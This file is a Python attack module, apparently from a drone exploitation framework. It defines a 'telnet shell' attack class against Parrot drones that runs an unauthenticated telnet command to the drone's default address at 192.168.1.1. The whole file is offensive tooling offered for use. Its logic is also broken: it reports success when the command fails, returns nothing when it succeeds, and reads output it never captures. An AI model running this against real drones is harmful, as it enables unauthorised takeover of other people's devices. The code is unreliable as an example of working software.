import telnetlib
from shared import Manufacturer, Model, AttackType, InterfaceMode, CommandExecutor
from modules.exploit.base_attack_script import BaseAttackScript, AttackResult, DroneTargetInfo
from modules.exploit.attack_factory import register_attack
import subprocess

@register_attack(
    manufacturer=Manufacturer.PARROT,
    models=[m.value for m in Model],
    attack_types=[AttackType.TELNET_SHELL],
)
class TelnetAccessAttackParrot(BaseAttackScript):
    def __init__(self, target_info):
        super().__init__(target_info); self.exec = CommandExecutor()
    
    def attack(self) -> AttackResult:
        # pre = self._ensure_interface_mode(InterfaceMode.MANAGED)
        # if not pre.status: return pre

        # if self.target_info.model == Model.PARROT_AR2:
        #     host = "192.168.1.1"
        # elif self.target_info.model == Model.PARROT_BEBOP:
        #     host = "192.168.42.1"  # example
        # else:
        #     return AttackResult(False, "", "", f"Unsupported model: {self.target_info.model.value}")

        try:
            cmd = f"telnet 192.168.1.1"
            subprocess.run(cmd, shell=True, check=True, text=True)
        except subprocess.CalledProcessError as e:
            print(f"[!] Shell command '{e.cmd}' failed with exit code {e.returncode}.")
            print(f"STDOUT: {e.stdout.strip()}")
            print(f"STDERR: {e.stderr.strip()}")
            return AttackResult(True, "", "", f"Telnet attempted ({self.target_info.model.value})")
        except Exception as e:
            print(f"[!] An error occurred while executing shell command: {e}")
            return AttackResult(False, "", str(e), "Telnet access failed")
            
